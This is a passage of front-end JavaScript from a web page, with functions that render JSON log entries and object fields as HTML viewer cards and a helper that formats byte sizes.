                for (const [k, v] of Object.entries(obj)) {
                    if (typeof v === 'object') continue;
                    html += `<div class="viewer-card"><span class="json-key">${k}:</span> <span class="json-val">${v}</span></div>`;
                }
            }
            return html;
        }

        function renderLogs(rawText) {
            const lines = rawText.trim().split('\n');
            return lines.map(line => {
                try {
                    const obj = JSON.parse(line);
                    const date = new Date(obj.d?.ts || obj.ts || Date.now()).toLocaleTimeString();
                    const type = obj.t || "LOG";
                    const details = obj.d || obj;
                    
                    let body = "";
                    if (details.body) body = details.body;
                    else if (details.txt) body = details.txt;
                    else if (details.tree) body = "[UI_TREE_SNAPSHOT]";
                    else body = JSON.stringify(details).substring(0, 100);

                    return `
                        <div class="viewer-card">
                            <span class="viewer-ts">${date}</span>
                            <span class="viewer-tag">${type}</span>
                            <div style="margin-top:5px; font-size:0.8rem;">${body}</div>
                            ${details.pkg ? `<div style="font-size:0.6rem; color:#555; margin-top:3px">Source: ${details.pkg}</div>` : ''}
                        </div>`;
                } catch (e) { return `<div class="viewer-card">${line}</div>`; }
            }).join('');
        }

        function formatBytes(bytes, decimals = 2) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const dm = decimals < 0 ? 0 : decimals;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
        }
    </script>
